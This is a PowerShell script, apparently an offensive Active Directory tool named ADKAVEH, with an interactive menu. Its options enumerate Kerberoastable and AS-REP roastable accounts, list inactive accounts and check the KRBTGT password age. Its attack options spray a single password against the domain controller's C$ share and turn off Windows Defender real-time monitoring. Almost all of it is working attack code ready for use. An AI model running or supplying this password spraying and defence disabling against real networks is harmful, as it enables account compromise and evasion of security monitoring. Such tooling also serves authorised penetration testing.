param (
    [switch]$Help
)

function Show-Help {
    Write-Host @"
========================================================
ADKAVEH https://www.x.com/kavehxnet
By Kaveh https://www.x.com/OffensivePwn
========================================================

This script is now an interactive tool for AD enumeration and attacks.
Run the script without parameters to start the interactive menu.

Options:
    -Help           Show this help message and exit.

After starting, the script will prompt for credentials which will be
used for all subsequent Active Directory queries.
"@ -ForegroundColor Cyan
}

if ($Help) {
    Show-Help
    exit
}

function Check-Modules {
    Write-Host "[*] Checking for required modules..." -ForegroundColor Gray
    $requiredModule = "ActiveDirectory"
    if (-not (Get-Module -ListAvailable -Name $requiredModule)) {
        Write-Host "[!] FATAL: Module '$requiredModule' is not installed. Please install RSAT-AD-PowerShell." -ForegroundColor Red
        exit
    }
    Import-Module $requiredModule -ErrorAction SilentlyContinue
    Write-Host "[+] '$requiredModule' module is loaded." -ForegroundColor Green
}

function Invoke-DisableDefender {
    Write-Warning "This is a VERY noisy action and will likely trigger alerts. High privileges are required."
    $confirm = Read-Host "Are you absolutely sure you want to proceed? (y/n)"
    if ($confirm -ne 'y') {
        Write-Host "[*] Operation cancelled by user." -ForegroundColor Yellow
        return
    }
    Write-Host "[!] Attempting to disable Windows Defender real-time monitoring..." -ForegroundColor Yellow
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        Write-Host "[+] Windows Defender real-time monitoring has been disabled." -ForegroundColor Green
    } catch {
        Write-Host "[!] FAILED to disable Windows Defender. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-KerberoastingScan {
    param($Credential)
    Write-Host "[*] Scanning for user accounts with a Service Principal Name (SPN)..." -ForegroundColor Cyan
    try {
        $spnAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, SamAccountName -Credential $Credential -ErrorAction Stop
        if ($spnAccounts) {
            Write-Host "[+] Found accounts vulnerable to Kerberoasting:" -ForegroundColor Green
            return $spnAccounts | Select-Object SamAccountName, @{Name='SPNs';Expression={$_.ServicePrincipalName}}
        } else {
            Write-Host "[-] No accounts with an SPN were found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[!] Kerberoasting scan failed. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-ASREPRoastingScan {
    param($Credential)
    Write-Host "[*] Scanning for accounts with 'Do Not Require Pre-Authentication'..." -ForegroundColor Cyan
    try {
        $asRepAccounts = Get-ADUser -Filter {UserAccountControl -band 4194304} -Properties SamAccountName -Credential $Credential -ErrorAction Stop
        if ($asRepAccounts) {
            Write-Host "[+] Found accounts vulnerable to AS-REP Roasting:" -ForegroundColor Green
            return $asRepAccounts | Select-Object SamAccountName
        } else {
            Write-Host "[-] No accounts vulnerable to AS-REP Roasting found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[!] AS-REP Roasting scan failed. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-InactiveAccountDiscovery {
    param($Credential)
    Write-Host "[*] Searching for accounts inactive for more than 90 days..." -ForegroundColor Cyan
    try {
        $inactiveThreshold = (Get-Date).AddDays(-90)
        $inactiveAccounts = Get-ADUser -Filter {LastLogonTimeStamp -lt $inactiveThreshold.ToFileTime()} -Properties LastLogonDate, SamAccountName -Credential $Credential -ErrorAction Stop
        if ($inactiveAccounts) {
            Write-Host "[+] Found inactive accounts:" -ForegroundColor Green
            return $inactiveAccounts | Select-Object SamAccountName, LastLogonDate | Sort-Object LastLogonDate
        } else {
            Write-Host "[-] No inactive accounts found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[!] Inactive Account Discovery failed. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Get-KrbTgtInfo {
    param($Credential)
    Write-Host "[*] Checking the KRBTGT account password last set time..." -ForegroundColor Cyan
    Write-Host "[i] A KRBTGT password that has been changed twice in a short period can indicate a Golden Ticket attack." -ForegroundColor Gray
    try {
        $krbtgt = Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet, PwdLastSet -Credential $Credential -ErrorAction Stop
        if ($krbtgt) {
            Write-Host "[+] KRBTGT account information:" -ForegroundColor Green
            return $krbtgt | Select-Object Name, DistinguishedName, PasswordLastSet
        }
    } catch {
        Write-Host "[!] Could not retrieve KRBTGT info. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-PasswordSprayingAttack {
    param($Credential)
    Write-Warning "This attack can cause account lockouts. Proceed with extreme caution."
    $targetDomainController = (Get-ADDomainController -Discover -Service PrimaryDC).HostName
    $passwordToTest = Read-Host "Enter the single password to spray"
    $userListPath = Read-Host "Enter the path to a file containing one username per line"

    if (-not (Test-Path $userListPath)) {
        Write-Host "[!] User list file not found at '$userListPath'." -ForegroundColor Red
        return
    }
    $users = Get-Content $userListPath

    Write-Host "[*] Starting password spray against '$targetDomainController' with a 5-second delay between attempts..." -ForegroundColor Cyan
    foreach ($user in $users) {
        try {
            $domainUser = "$($Credential.GetNetworkCredential().Domain)\$user"
            $testCred = New-Object System.Management.Automation.PSCredential($domainUser, (ConvertTo-SecureString $passwordToTest -AsPlainText -Force))
            
            $null = New-PSDrive -Name "T" -PSProvider FileSystem -Root "\\$targetDomainController\C$" -Credential $testCred -ErrorAction Stop
            Write-Host "[+] SUCCESS: Valid credentials for user: $user" -ForegroundColor Green
            Remove-PSDrive -Name "T" -Force
        } catch {
            Write-Host "[-] FAILED: Invalid credentials for user: $user" -ForegroundColor Yellow
        }
        Start-Sleep -Seconds 5
    }
}

Clear-Host
Show-Help
Check-Modules

Write-Host "`nPlease provide credentials for Active Directory operations." -ForegroundColor Yellow
$username = Read-Host "Enter Username"
$domain = Read-Host "Enter Domain (e.g., contoso.local)"
$password = Read-Host "Enter Password" -AsSecureString
$credential = New-Object System.Management.Automation.PSCredential("$domain\$username", $password)

while ($true) {
    Write-Host @"

==================== ADKAVEH Main Menu ====================
    -- Enumeration --
    1. Scan for Kerberoastable Accounts
    2. Scan for AS-REP Roastable Accounts
    3. Find Inactive User Accounts (>90 days)
    4. Check KRBTGT Account Info (Golden Ticket Indicator)

    -- Attack & High-Risk --
    5. Perform Password Spraying Attack
    6. Disable Windows Defender (VERY NOISY!)

    99. Exit
============================================================
"@ -ForegroundColor White

    $choice = Read-Host "Enter your choice"

    switch ($choice) {
        '1' { Invoke-KerberoastingScan -Credential $credential | Format-Table -AutoSize }
        '2' { Invoke-ASREPRoastingScan -Credential $credential | Format-Table -AutoSize }
        '3' { Invoke-InactiveAccountDiscovery -Credential $credential | Format-Table -AutoSize }
        '4' { Get-KrbTgtInfo -Credential $credential | Format-Table -AutoSize }
        '5' { Invoke-PasswordSprayingAttack -Credential $credential }
        '6' { Invoke-DisableDefender }
        '99' {
            Write-Host "[*] Exiting. Stay safe." -ForegroundColor Green
            exit
        }
        default { Write-Host "[!] Invalid choice. Please try again." -ForegroundColor Red }
    }
}
